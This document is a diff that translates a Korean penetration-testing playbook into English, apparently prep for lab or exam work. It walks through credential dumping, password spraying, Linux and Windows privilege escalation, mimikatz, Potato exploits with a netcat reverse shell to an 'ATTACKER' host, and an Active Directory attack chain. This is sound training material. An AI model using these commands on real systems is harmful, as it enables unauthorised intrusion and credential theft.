-# 찾은 것은 읽기: Get-Content "<PATH>" -EA SilentlyContinue
+# Read what you find: Get-Content "<PATH>" -EA SilentlyContinue
 ```
 
 ```powershell
-# Windows: 로컬 DB에서 creds 확인 (Step 4에서 MySQL/MSSQL 발견 시)
+# Windows: check creds in local DBs (if MySQL/MSSQL was found in Step 4)
 .\mysql.exe -u root -e "SHOW DATABASES;"
-# 기본 DB가 아닌 것은 전부 덤프:
+# Dump every non-default database:
 .\mysql.exe -u root -e "USE creds; SHOW TABLES;"
 .\mysql.exe -u root -e "USE creds; SELECT * FROM users;"
 .\mysql.exe -u root -e "USE wordpress; SELECT user_login,user_pass FROM wp_users;"
 ```
 
-발견한 모든 creds → creds 표 갱신 → 즉시 전체 스프레이.
+Every credential you find → update the creds table → immediately spray everywhere.
 
 ```bash
-# 지금까지 찾은 모든 creds로 파일 생성
+# Create a file with all creds found so far
 echo -e "administrator\ncharlotte\njohn" > users.txt
 echo -e "Password1\nFound_Pass2" > passes.txt
 
-# 모든 유저 x 모든 패스워드 x 모든 서비스 x 모든 IP 스프레이
+# Spray every user × every password × every service × every IP
 nxc smb <SUBNET>/24 -u users.txt -p passes.txt --continue-on-success
 nxc winrm <SUBNET>/24 -u users.txt -p passes.txt --continue-on-success
 nxc rdp <SUBNET>/24 -u users.txt -p passes.txt --continue-on-success
 nxc mssql <SUBNET>/24 -u users.txt -p passes.txt --continue-on-success
 ```
 
-발견 즉시 모든 서비스에 스프레이하는 이 단일 습관이 체인을 만든다.
+Spraying every discovered credential against every service immediately is the habit that builds the chain.
 
 ### Step 6 — Privesc
 
-→ PHASE 5 (Linux) 또는 PHASE 6 (Windows)
+→ PHASE 5 (Linux) or PHASE 6 (Windows)
 
-### Step 7 — root/admin 획득 후 (매번 수행)
+### Step 7 — After getting root/admin (do this every time)
 
 ```bash
-# 1. proof 스크린샷 (4개 한 장에 — 건너뛰지 않는다)
+# 1. proof screenshot (4 items in one shot — do not skip)
 # Linux:   whoami && hostname && ip a && cat /root/proof.txt
 # Windows: whoami; hostname; ipconfig; type C:\Users\Administrator\Desktop\proof.txt
 
-# 2. creds 전부 덤프 (메모리 + 레지스트리)
-# Kali에서: impacket-secretsdump 'DOMAIN/USER:PASS'@TARGET_IP
+# 2. Dump all creds (memory + registry)
+# From Kali: impacket-secretsdump 'DOMAIN/USER:PASS'@TARGET_IP
 # Windows:  mimikatz "privilege::debug" "sekurlsa::logonpasswords" "exit"
 # Linux:    cat /etc/shadow
 
-# 8항목 체크리스트 실행. mimikatz/secretsdump가 놓치는 creds을 잡는다:
-# 해시가 든 로그 파일, 평문 creds이 든 텍스트 파일, SSH 키, 백업 파일, 웹 config
+# Run the 8-item checklist. Catches creds that mimikatz/secretsdump miss:
+# hash-bearing log files, plaintext cred text files, SSH keys, backup files, web configs
 
-# 4. 내부 네트워크 재확인 (root는 새 인터페이스를 볼 수 있다)
-# ip a / ipconfig /all — Step 4 재실행
+# 4. Re-check the internal network (root may see new interfaces)
+# ip a / ipconfig /all — rerun Step 4
 
-# 5. 새 creds 즉시 스프레이
+# 5. Spray new creds immediately
 nxc smb ALL_IPS -u 'NEW_USER' -p 'NEW_PASS' --continue-on-success
 ```
 
 ## PHASE 5 — Linux Privilege Escalation
 
-순서대로 확인. 처음 3개가 벡터의 약 80%를 잡는다.
+Check in order. The first 3 catch about 80% of vectors.
 
 1. `sudo -l` → GTFOBins
 2. SUID: `find / -perm -u=s -type f 2>/dev/null` → GTFOBins
-3. Cron/timers: `cat /etc/crontab && ls -la /etc/cron.d/` + `pspy64` 실행 → 쓰기 가능한 스크립트? PATH hijack?
-4. Capabilities: `getcap -r / 2>/dev/null` → cap_setuid면 즉시 root
-5. LinPEAS: `./linpeas.sh` 실행 후 출력 검토 → RED/YELLOW 항목 확인
-6. 패스워드: `grep -ri 'password' /var/www/ /opt/ /home/` + bash_history → creds 재사용
-7. SSH 키: `find / -name id_rsa 2>/dev/null` → 다른 유저로 SSH
-8. 쓰기 가능한 /etc/passwd: `ls -la /etc/passwd` → root 유저 추가
-9. 내부 서비스: `ss -tulnp` → localhost 전용이면 Chisel 포워드 → PHASE 4 Step 4B
-10. NFS no_root_squash: `cat /etc/exports` → 마운트 + SUID bash
-11. Docker/LXD 그룹: `id` → 컨테이너 탈출
-12. 커널(최후 수단): `uname -a` + linux-exploit-suggester → PwnKit, DirtyPipe
+3. Cron/timers: `cat /etc/crontab && ls -la /etc/cron.d/` + run `pspy64` → writable script? PATH hijack?
+4. Capabilities: `getcap -r / 2>/dev/null` → cap_setuid means immediate root
+5. LinPEAS: run `./linpeas.sh` and review the output → check RED/YELLOW items
+6. Passwords: `grep -ri 'password' /var/www/ /opt/ /home/` + bash_history → credential reuse
+7. SSH keys: `find / -name id_rsa 2>/dev/null` → SSH as another user
+8. Writable /etc/passwd: `ls -la /etc/passwd` → add a root user
+9. Internal services: `ss -tulnp` → localhost-only → Chisel forward → PHASE 4 Step 4B
+10. NFS no_root_squash: `cat /etc/exports` → mount + SUID bash
+11. Docker/LXD group: `id` → container escape
+12. Kernel (last resort): `uname -a` + linux-exploit-suggester → PwnKit, DirtyPipe
 
 ## PHASE 6 — Windows Privilege Escalation
 
-어떤 쉘인지 확인: `C:\>` = CMD, `PS C:\>` = PowerShell. 아래 명령은 표기 없으면 양쪽 동작. 전환: `cmd` 또는 `powershell -ep bypass`.
+Identify the shell type: `C:\>` = CMD, `PS C:\>` = PowerShell. Commands below work in both unless noted. Switch with: `cmd` or `powershell -ep bypass`.
 
-2. WinPEAS: `.\winpeas.exe cmd | Tee-Object -FilePath .\winpeas.txt` (PS) 또는 `.\winpeas.exe cmd > winpeas.txt` (CMD) → RED/YELLOW 확인
-3. 서비스 설정 오류: `wmic service get name,pathname,startmode` → unquoted path 또는 쓰기 가능한 바이너리 → `sc config`
-4. 저장된 creds: `cmdkey /list` → 항목 발견 → `runas /savecred`
-5. PS 히스토리 — CMD: `type C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt` / PS: `Get-Content $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt -EA SilentlyContinue` → creds 재사용
+2. WinPEAS: `.\winpeas.exe cmd | Tee-Object -FilePath .\winpeas.txt` (PS) or `.\winpeas.exe cmd > winpeas.txt` (CMD) → check RED/YELLOW
+3. Service misconfiguration: `wmic service get name,pathname,startmode` → unquoted path or writable binary → `sc config`
+4. Saved creds: `cmdkey /list` → entry found → `runas /savecred`
+5. PS history — CMD: `type C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt` / PS: `Get-Content $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt -EA SilentlyContinue` → credential reuse
 6. AlwaysInstallElevated: `reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated` → msfvenom MSI
-7. SAM/SYSTEM 백업 — CMD: `dir C:\Windows\Repair\SAM` / PS: `Get-ChildItem C:\Windows\Repair\SAM -EA SilentlyContinue` → secretsdump
-8. 예약 작업: `schtasks /query /fo LIST /v` → 쓰기 가능한 스크립트?
-10. DLL hijacking — CMD: `echo %PATH%` / PS: `$env:PATH -split ';'` → PATH의 쓰기 가능 디렉터리 → DLL 심기
-11. 내부 서비스: `netstat -ano | findstr LISTENING` → 직접 상호작용 먼저 (MySQL `-e`, curl) → 필요하면 Chisel 터널 → PHASE 4 Step 4B
+7. SAM/SYSTEM backup — CMD: `dir C:\Windows\Repair\SAM` / PS: `Get-ChildItem C:\Windows\Repair\SAM -EA SilentlyContinue` → secretsdump
+8. Scheduled tasks: `schtasks /query /fo LIST /v` → writable script?
+10. DLL hijacking — CMD: `echo %PATH%` / PS: `$env:PATH -split ';'` → writable directory on PATH → plant a DLL
+11. Internal services: `netstat -ano | findstr LISTENING` → interact directly first (MySQL `-e`, curl) → if needed, Chisel tunnel → PHASE 4 Step 4B
 12. UAC bypass: `whoami /groups` → Medium Mandatory + admin → fodhelper
 
-추가 실행:
+Additional commands:
 
-- CMD: `findstr /si "password" *.txt *.xml *.ini *.config` (C:\ 이 아니라 유저 홈에서)
+- CMD: `findstr /si "password" *.txt *.xml *.ini *.config` (run from the user's home, not C:\)
 - PS: `Get-ChildItem -Recurse -Include *.txt,*.xml,*.ini,*.config -EA SilentlyContinue | Select-String "password" -List | Select Path`
-- 공용: `reg query HKLM /f password /t REG_SZ /s`
+- Both shells: `reg query HKLM /f password /t REG_SZ /s`
 
-Potato 공격 빠른 참조:
+Quick reference for Potato attacks:
 
-- Server 2016 이하: JuicyPotato
+- Server 2016 and older: JuicyPotato
 - Server 2019+ / Win10 1809+: PrintSpoofer
-- 범용: GodPotato 또는 SigmaPotato
+- Universal: GodPotato or SigmaPotato
 
 ```powershell
 PrintSpoofer.exe -i -c cmd
 GodPotato-NET4.exe -cmd "C:\Windows\Temp\nc.exe ATTACKER 443 -e cmd.exe"
 ```
 
-## WinPEAS / LinPEAS 출력 읽는 법 (전부 읽지 않는다)
+## Reading WinPEAS / LinPEAS output (don't read it all)
 
-PEAS 출력은 수천 줄. 전부 읽지 않고 특정 섹션을 검색한다.
+PEAS output runs to thousands of lines. Don't read it all — search specific sections.
 
-### LinPEAS — 이 순서로 확인
+### LinPEAS — check in this order
 
 ```bash
-# 먼저 파일로 저장
+# Save to a file first
 ./linpeas.sh | tee linpeas.txt
-# 그다음 중요한 것 검색:
-grep -A5 '\[1\]' linpeas.txt                    # RED/YELLOW 발견 (최우선)
-grep -A3 'sudo -l' linpeas.txt                  # sudo 권한
-grep -B2 -A2 'SUID' linpeas.txt                 # SUID 바이너리
+# Then search for the important stuff:
+grep -A5 '\[1\]' linpeas.txt                    # RED/YELLOW findings (top priority)
+grep -A3 'sudo -l' linpeas.txt                  # sudo rights
+grep -B2 -A2 'SUID' linpeas.txt                 # SUID binaries
 grep -B2 -A5 'Cron' linpeas.txt                 # cron job
-grep -A3 'Capabilities' linpeas.txt             # 파일 capabilities
-grep -B2 -A5 'password\|credential' linpeas.txt # 파일 속 패스워드
-grep -A3 'writable' linpeas.txt                 # 쓰기 가능 파일/디렉터리
-grep -A5 'docker\|lxd' linpeas.txt              # 컨테이너 탈출
-grep -A3 '127.0.0.1' linpeas.txt                # localhost 전용 서비스
+grep -A3 'Capabilities' linpeas.txt             # file capabilities
+grep -B2 -A5 'password\|credential' linpeas.txt # passwords in files
+grep -A3 'writable' linpeas.txt                 # writable files/directories
+grep -A5 'docker\|lxd' linpeas.txt              # container escape
+grep -A3 '127.0.0.1' linpeas.txt                # localhost-only services
 ```
 
-색 가이드: RED/YELLOW = 거의 확실히 악용 가능. RED = 치명적 발견. GREEN = 참고 정보.
+Color guide: RED/YELLOW = almost certainly exploitable. RED = critical finding. GREEN = reference info.
 
-### WinPEAS — 이 순서로 확인
+### WinPEAS — check in this order
 
 ```powershell
-# 파일로 저장 (색 때문에 터미널에서 판독 불가 — 리다이렉트)
+# Save to a file (colors make terminal output unreadable — redirect)
 .\winpeas.exe cmd > C:\Windows\Temp\winpeas.txt
 
-# Kali로 다운로드 (SMB 서버 또는 evil-winrm download) 후 검색:
+# Download to Kali (SMB server or evil-winrm download), then search:
 grep -A5 'Password\|credential\|AutoLogon' winpeas.txt
 grep -A5 'SeImpersonate\|SeBackup\|SeDebug\|SeRestore' winpeas.txt
-grep -A5 'Unquoted\|Modifiable' winpeas.txt      # 서비스 설정 오류
+grep -A5 'Unquoted\|Modifiable' winpeas.txt      # service misconfigurations
 grep -A5 'AlwaysInstallElevated' winpeas.txt
 grep -A5 'PSReadLine\|ConsoleHost_history' winpeas.txt
 grep -A5 'Unattend\|web.config\|SiteList' winpeas.txt
-grep -B2 -A5 '127.0.0.1' winpeas.txt             # localhost 서비스
+grep -B2 -A5 '127.0.0.1' winpeas.txt             # localhost services
 grep -A3 'Backup Operators\|Server Operators\|DnsAdmins' winpeas.txt
 ```
 
-단축: `winpeas.exe` 가 아니라 `winpeas.exe cmd` 로 실행 — `cmd` 플래그가 파일 리다이렉트를 깨는 ANSI 색 없는 깔끔한 출력을 준다.
+Shortcut: run `winpeas.exe cmd` instead of `winpeas.exe` — the `cmd` flag gives clean output without ANSI colors, which break file redirection.
 
-PEAS 출력을 위에서 아래로 30분 읽지 않는다. 위 섹션을 grep하고, RED/YELLOW 확인하고, 다음으로 넘어간다.
+Don't read PEAS output top to bottom for 30 minutes. Grep the sections above, check the RED/YELLOW items, and move on.
 
 ## PHASE 7 — Active Directory (Assumed Breach)
 
-### AD 체인 (암기)
+### AD chain (memorize)
 
 ```text
-1. creds 제공 → BloodHound + netexec 열거 (Playbook Phase 1)
+1. Creds provided → BloodHound + netexec enumeration (Playbook Phase 1)
 2. Kerberoast + AS-REP roast → crack → spray (Phase 2)
-3. BloodHound 확인: ACL 엣지? ADCS? Delegation? (Phase 3-4)
-4. admin 획득한 모든 머신 → secretsdump → 새 해시 스프레이 (Phase 5-6)
-5. 새 creds마다 2-4 반복
+3. BloodHound check: ACL edges? ADCS? Delegation? (Phase 3-4)
+4. Every machine where you get admin → secretsdump → spray new hashes (Phase 5-6)
+5. Repeat 2-4 for every new cred
 6. DA → DCSync → PtH to DC → proof.txt (Phase 9)
 ```
 
-### AD 관련 리마인더
+### AD reminders
 
-- BloodHound 항상 먼저. 공격 전에 수집 + 최단 경로 확인.
-- creds 표가 전부. secretsdump, 크랙, config 파일 발견 때마다 갱신. 즉시 스프레이.
-- 세션 확인: BloodHound 커스텀 쿼리 `MATCH p=(c:Computer)-[:HasSession]->(m:User) RETURN p` — 고가치 유저가 어디 로그인했는지 알려준다.
-- 막히면? BloodHound 쿼리 재실행. 모든 SMB 공유 읽기. ADCS 확인. 새 유저로 Kerberoast 재시도. 모든 패스워드 변형 스프레이.
+- BloodHound first, always. Collect and check shortest paths before attacking.
+- The creds table is everything. Update it with every secretsdump, crack, or config file found. Spray immediately.
+- Check sessions: BloodHound custom query `MATCH p=(c:Computer)-[:HasSession]->(m:User) RETURN p` — shows where high-value users are logged in.
+- Stuck? Re-run BloodHound queries. Read all SMB shares. Check ADCS. Retry Kerberoast with new users. Spray every password variant.
 
-## 빠른 참조 링크 (같은 폴더 문서)
+## Quick reference links (documents in this folder)
 
-- 서비스별 열거 → [enumeration.md](enumeration.md)
-- 웹 앱 테스트 → [web-attacks.md](web-attacks.md), [sql-injection.md](sql-injection.md)
-- 쉘 획득 / 파일 전송 → [shells-and-transfers.md](shells-and-transfers.md)
+- Per-service enumeration → [enumeration.md](enumeration.md)
+- Web app testing → [web-attacks.md](web-attacks.md), [sql-injection.md](sql-injection.md)
+- Shell acquisition / file transfer → [shells-and-transfers.md](shells-and-transfers.md)
 - Linux privesc → [linux-privilege-escalation.md](linux-privilege-escalation.md)
 - Windows privesc → [windows-privilege-escalation.md](windows-privilege-escalation.md)
 - Active Directory → [active-directory-playbook.md](active-directory-playbook.md), [active-directory-tools.md](active-directory-tools.md)
-- 피벗팅 → [pivoting-and-tunneling.md](pivoting-and-tunneling.md), [ligolo-ng.md](ligolo-ng.md)
-- 해시 크랙 → [hash-types.md](hash-types.md), [password-attacks.md](password-attacks.md)
-- 버퍼 오버플로 → [buffer-overflows.md](buffer-overflows.md)
-- 리포트 작성 → [report-writing.md](report-writing.md)
+- Pivoting → [pivoting-and-tunneling.md](pivoting-and-tunneling.md), [ligolo-ng.md](ligolo-ng.md)
+- Hash cracking → [hash-types.md](hash-types.md), [password-attacks.md](password-attacks.md)
+- Buffer overflows → [buffer-overflows.md](buffer-overflows.md)
+- Report writing → [report-writing.md](report-writing.md)
